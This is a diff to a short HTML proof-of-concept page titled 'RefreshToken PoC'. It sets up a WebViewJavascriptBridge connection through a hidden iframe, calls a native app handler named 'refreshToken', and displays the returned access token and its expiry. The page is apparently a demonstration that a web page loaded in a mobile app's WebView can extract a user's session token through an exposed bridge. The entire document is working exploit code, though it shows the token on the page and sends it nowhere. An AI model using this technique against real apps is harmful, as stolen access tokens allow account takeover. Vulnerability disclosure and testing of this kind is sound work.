@@ -2,21 +2,40 @@
   <body style="background:#111; color:#0f0; font-family:monospace;">
     <h1>RefreshToken PoC</h1>
     <pre id="result">Waiting for token...</pre>
-    
-    <script>
-    window.WebViewJavascriptBridge.callHandler("refreshToken", "", function(resp) {
-      let output = "";
 
-      try {
-        const json = JSON.parse(resp);
-        output += "Access Token:\n" + json.token + "\n\n";
-        output += "Expires In: " + json.expiresIn + "\n";
-      } catch (e) {
-        output = "Error parsing JSON:\n" + resp;
+    <script>
+      function setupBridge(callback) {
+        if (window.WebViewJavascriptBridge) {
+          return callback(WebViewJavascriptBridge);
+        }
+        if (window.WVJBCallbacks) {
+          return window.WVJBCallbacks.push(callback);
+        }
+        window.WVJBCallbacks = [callback];
+        var WVJBIframe = document.createElement('iframe');
+        WVJBIframe.style.display = 'none';
+        WVJBIframe.src = 'wvjbscheme://__BRIDGE_LOADED__';
+        document.documentElement.appendChild(WVJBIframe);
+        setTimeout(function () {
+          document.documentElement.removeChild(WVJBIframe);
+        }, 0);
       }
 
-      document.getElementById("result").innerText = output;
-    });
+      setupBridge(function (bridge) {
+        bridge.callHandler("refreshToken", "", function (resp) {
+          let output = "";
+
+          try {
+            const json = JSON.parse(resp);
+            output += "Access Token:\n" + json.token + "\n\n";
+            output += "Expires In: " + json.expiresIn;
+          } catch (e) {
+            output = "Error parsing response:\n" + resp;
+          }
+
+          document.getElementById("result").innerText = output;
+        });
+      });
     </script>
   </body>
 </html>
